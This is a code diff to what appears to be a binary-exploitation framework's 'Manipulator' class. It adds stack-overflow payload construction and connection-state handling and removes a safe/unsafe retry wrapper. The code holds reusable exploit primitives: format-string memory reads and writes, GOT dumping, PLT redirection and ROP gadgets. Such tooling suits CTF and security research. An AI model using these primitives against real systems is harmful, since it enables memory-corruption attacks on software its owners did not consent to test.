@@ -5,47 +5,69 @@ l = logging.getLogger("puppeteer.manipulator")
 import struct
 import string # pylint: disable=W0402
 import itertools
-import functools
 
-from .errors import NotLeetEnough
-from .formatter import FmtStr
 from .architectures import x86
-from .rop import ROPChain, ROPGadget
-from .utils import unleet
-
-def _safe_unsafe(f):
-    '''
-    If safe is None, try safe first, then unsafe.
-    '''
-
-    @functools.wraps(f)
-    def wrapper(*args, **kwargs):
-        if 'safe' not in kwargs or kwargs['safe'] is None:
-            try:
-                kwargs['safe'] = True
-                return f(*args, **kwargs)
-            except NotLeetEnough:
-                kwargs['safe'] = False
-                return f(*args, **kwargs)
-        else:
-            return f(*args, **kwargs)
-
-    return wrapper
 
 class Manipulator(object):
     def __init__(self, arch=x86):
         '''
         This should connect to or spawn up the program in question.
         '''
+
         self.arch = arch
+
+        # this is information that is always valid, even if the binary is restarted
+        self.permanent_info = { }
+
+        # this is information that is valid until the binary is restarted
+        self.instance_info = { }
+
+        # this is information that is valid for a single connection
+        self.connection_info = { }
+
         self.plt = { }
         self.rop_cleanups = { }
-        self.locations = { }
-        self.info = { }
 
         self.got_base = 0
         self.got_size = 0
         self.got_names = [ ]
+
+        self.auto_connection = None
+
+    def info(self, k):
+        for d in (self.connection_info, self.instance_info, self.permanent_info):
+            if k in d:
+                return d[k]
+
+        raise KeyError(k)
+
+    #
+    # Connection stuff
+    #
+
+    def connect(self): # pylint: disable=no-self-use
+        if self.auto_connection is None:
+            raise Exception("Please implement a connect function or set self.auto_connection!")
+        else:
+            return self.auto_connection.connect()
+
+    def _implemented_connect(self):
+        return self.connect.im_class != Manipulator or self.auto_connection is not None
+
+    def _is_connected(self):
+        return self.auto_connection.connected
+
+    def _crash(self):
+        l.debug("Program crashed!")
+        self._disconnect()
+        self.instance_info = { }
+        self.connection_info = { }
+
+    def _disconnect(self):
+        l.debug("Program disconnected!")
+        if self.auto_connection:
+            self.auto_connection.connected = False
+        self.connection_info = { }
 
     #
     # Utility funcs
@@ -73,34 +95,23 @@ class Manipulator(object):
         if type(n) == str:
             return struct.unpack(self.arch.struct_fmt, n)[0]
 
-    def _get_vulns(self, t, safe):
+    def _get_vulns(self, t):
         vulns = [ ]
-        unsafe_vulns = [ ]
 
-        l.debug("Looking for a %s vuln with safe=%s", t, safe)
+        l.debug("Looking for a %s vuln...", t)
 
         for a in dir(self):
             #l.debug("... checking attribute %s", a)
             f = getattr(self, a)
             if hasattr(f, 'puppeteer_flags') and f.puppeteer_flags['type'] == t:
-                if f.puppeteer_flags['safe']:
-                    vulns.append(f)
-                else:
-                    unsafe_vulns.append(f)
+                vulns.append(f)
 
-        if safe is None:
-            r = vulns + unsafe_vulns
-        elif safe:
-            r = vulns
-        elif not safe:
-            r = unsafe_vulns
+        if len(vulns) == 0:
+            unleet("Couldn't find an %s vuln" % t)
+        return vulns
 
-        if len(r) == 0:
-            raise NotLeetEnough("Couldn't find a %s vuln with safe=%s (others might have been tried and failed previously)" % (t, safe))
-        return r
-
-    def _do_vuln(self, vuln_type, args, kwargs, safe=None):
-        funcs = self._get_vulns(vuln_type, safe)
+    def _do_vuln(self, vuln_type, args, kwargs):
+        funcs = self._get_vulns(vuln_type)
 
         for f in funcs:
             try:
@@ -109,69 +120,65 @@ class Manipulator(object):
             except NotLeetEnough:
                 l.debug("... failed!")
 
-        l.debug("Couldn't find an appropriate vuln :-(")
-        raise NotLeetEnough("No %s%s functions available!" % (('safe ' if safe is True else ('unsafe ' if self is False else '')), vuln_type))
+        unleet("No %s functions available!" % vuln_type)
 
     #
     # Actions!
     #
 
-    @_safe_unsafe
-    def do_memory_read(self, addr, length, safe=None):
+    def do_memory_read(self, addr, length):
         ''' Finds and executes an vuln that does a memory read. '''
 
         # first, try to do it directly
         try:
-            funcs = self._get_vulns('memory_read', safe)
-
+            funcs = self._get_vulns('memory_read')
             for f in funcs:
-                l.debug("Trying a direct memory read with %s", f.__name__)
-                max_size = f.puppeteer_flags['max_size']
+                try:
+                    l.debug("Trying a direct memory read with %s", f.__name__)
+                    max_size = f.puppeteer_flags['max_size']
 
-                r = ""
-                while len(r) < length:
-                    toread = min(length, max_size)
-                    l.debug("... reading %d bytes", toread)
-                    r += f(addr + len(r), toread)
-                return r
+                    r = ""
+                    while len(r) < length:
+                        toread = min(length, max_size)
+                        l.debug("... reading %d bytes", toread)
+                        r += f(addr + len(r), toread)
+                    return r
+                except NotLeetEnough:
+                    continue
         except NotLeetEnough:
-            l.debug("... l4m3!")
+            l.debug("... l4m3! Trying printf read.")
 
         # now do the printf path
-        return self.do_printf_read(addr, length, safe=safe)
+        return self.do_printf_read(addr, length)
 
-    @_safe_unsafe
-    def do_register_read(self, reg, safe=None):
+    def do_register_read(self, reg):
         ''' Finds and executes an vuln that does a register read. '''
-        return self._do_vuln('register_read', (reg,), { }, safe=safe)
+        return self._do_vuln('register_read', (reg,), { })
 
-    @_safe_unsafe
-    def do_memory_write(self, addr, content, safe=None):
+    def do_memory_write(self, addr, content):
         ''' Finds and executes an vuln that does a memory write. '''
 
         l.debug("First trying a direct memory write.")
         try:
-            return self._do_vuln('memory_write', (addr, content), { }, safe=True)
+            return self._do_vuln('memory_write', (addr, content), { })
         except NotLeetEnough:
             l.debug("... just can't do it, captain!")
 
         l.debug("Now trying a naive printf write.")
-        return self.do_printf_write((addr, content), safe=safe)
+        return self.do_printf_write((addr, content))
 
-    @_safe_unsafe
-    def do_register_write(self, reg, content, safe=None):
+    def do_register_write(self, reg, content):
         ''' Finds and executes an vuln that does a register write. '''
-        return self._do_vuln('register_write', (reg, content), { }, safe=safe)
+        return self._do_vuln('register_write', (reg, content), { })
 
-    @_safe_unsafe
-    def do_printf(self, fmt, safe=None):
+    def do_printf(self, fmt):
         '''
         Finds and executes an vuln that does a memory read.
 
         @param fmt: the format string!
         @param safe: safety!
         '''
-        funcs = self._get_vulns('printf', safe)
+        funcs = self._get_vulns('printf')
 
         for f in funcs:
             try:
@@ -200,10 +207,9 @@ class Manipulator(object):
                 l.debug("... failed!")
 
         l.debug("Couldn't find an appropriate vuln :-(")
-        raise NotLeetEnough("No %s%s functions available!" % (('safe ' if safe is True else ('unsafe ' if self is False else '')), 'printf'))
+        unleet("No working printf functions available!")
 
-    @_safe_unsafe
-    def do_printf_read(self, addr, length, max_failures=10, safe=None):
+    def do_printf_read(self, addr, length, max_failures=10):
         '''
         Do a printf-based memory read.
 
@@ -228,7 +234,7 @@ class Manipulator(object):
             fmt = FmtStr(self.arch).absolute_read(cur_addr)
 
             try:
-                new_content = self.do_printf(fmt, safe=safe)[:left_length]
+                new_content = self.do_printf(fmt)[:left_length]
             except NotLeetEnough:
                 failures += 1
                 content += '\00'
@@ -244,8 +250,34 @@ class Manipulator(object):
 
         return content
 
-    @_safe_unsafe
-    def do_printf_write(self, writes, safe=None):
+    def do_replace_stack(self, new_ip, pre_stack=None, post_stack=None):
+        '''
+        Finds and executes a vuln that overflows the stack.
+        '''
+        funcs = self._get_vulns('stack_overflow')
+        for f in funcs:
+            if pre_stack is None:
+                pre_stack = "A" * f.puppeteer_flags['ip_distance']
+
+            if f.puppeteer_flags['ip_distance'] != len(pre_stack):
+                l.debug("Pre-stack length doesn't match the distance to the saved IP!")
+                continue
+
+            payload = pre_stack + self.pack(new_ip) + post_stack
+
+            try:
+                l.debug("Trying %s", f)
+                return f(payload)
+            except NotLeetEnough:
+                l.debug("... darn")
+                continue
+
+        unleet("Couldn't find a compatible stack overflow.")
+
+    def do_stack_overflow(self, towrite):
+        return self._do_vuln('stack_overflow', (towrite,), { })
+
+    def do_printf_write(self, writes):
         '''
         Do a memory write using a printf vulnerability.
 
@@ -256,10 +288,9 @@ class Manipulator(object):
         # this is an overwrite of a set of bytes. We don't care about the output.
         chunks = [ (writes[0]+i, j) for i,j in enumerate(writes[1]) ]
         fmt = FmtStr(self.arch).absolute_writes(chunks)
-        return self.do_printf(fmt, safe=safe)
+        return self.do_printf(fmt)
 
-    @_safe_unsafe
-    def do_relative_read(self, offset, length, reg=None, safe=None):
+    def do_relative_read(self, offset, length, reg=None):
         try:
             reg = self.arch.sp_name if reg is None else reg
             return self.do_memory_read(self.do_register_read(reg) + offset, length)
@@ -270,33 +301,33 @@ class Manipulator(object):
             result = ""
             while len(result) < length:
                 fmt = FmtStr(self.arch).relative_read(offset/self.arch.bytes, length/self.arch.bytes)
-                result += self.do_printf(fmt, safe=safe)
+                result += self.do_printf(fmt)
             return self.fix_endness_strided(result.decode('hex'))
 
     #
     # More complex stuff
     #
 
-    def read_got_entry(self, which, safe=None):
+    def read_got_entry(self, which):
         if type(which) == str:
             which = self.got_names.index(which)
-        return self.do_memory_read(self.got_base+which*self.arch.bytes, self.arch.bytes, safe=safe)
+        return self.do_memory_read(self.got_base+which*self.arch.bytes, self.arch.bytes)
 
-    def dump_got(self, safe=None):
-        return self.do_memory_read(self.got_base, self.got_size*self.arch.bytes, safe=safe)
+    def dump_got(self):
+        return self.do_memory_read(self.got_base, self.got_size*self.arch.bytes)
 
     def do_page_read(self, addr):
         base = addr - (addr % self.arch.page_size)
         return self.do_memory_read(base, self.arch.page_size)
 
-    def redirect_library_function(self, name, target, safe=None):
+    def redirect_library_function(self, name, target):
         '''
         Redirects a PLT entry to jump to target.
 
         @params name: the name to redirect
         @params target: the address to redirect to
         '''
-        self.do_memory_write(self.plt[name], self.pack(target), safe=safe)
+        self.do_memory_write(self.plt[name], self.pack(target))
 
     def read_stack(self, length):
         '''
@@ -329,11 +360,11 @@ class Manipulator(object):
         for i in itertools.count(start=start_offset):
             l.debug("... checking offset %d", i)
             v = self.unpack(self.do_relative_read(i*self.arch.bytes, self.arch.bytes))
-            if v >= self.locations['main'] and v <= self.locations['#main_end']:
+            if v >= self.info('main_start') and v <= self.info('main_end'):
                 l.debug("... found the return address to main (specifically, to 0x%x) at offset %d!", v, i)
                 break
 
-        i += 3 + self.info['main_stackframe_size'] / self.arch.bytes
+        i += 3 + self.info('main_stackframe_size') / self.arch.bytes
         l.debug("... the return address into __libc_start_main should be at offset %d", i)
 
         v = self.unpack(self.do_relative_read(i*self.arch.bytes, self.arch.bytes))
@@ -479,3 +510,9 @@ class Manipulator(object):
         This returns a new ROPGadget (and takes the same args as ROPGadget).
         '''
         return ROPGadget(self.arch, *args, **kwargs)
+
+from .errors import NotLeetEnough
+from .formatter import FmtStr
+from .rop import ROPChain, ROPGadget
+from .utils import unleet
+
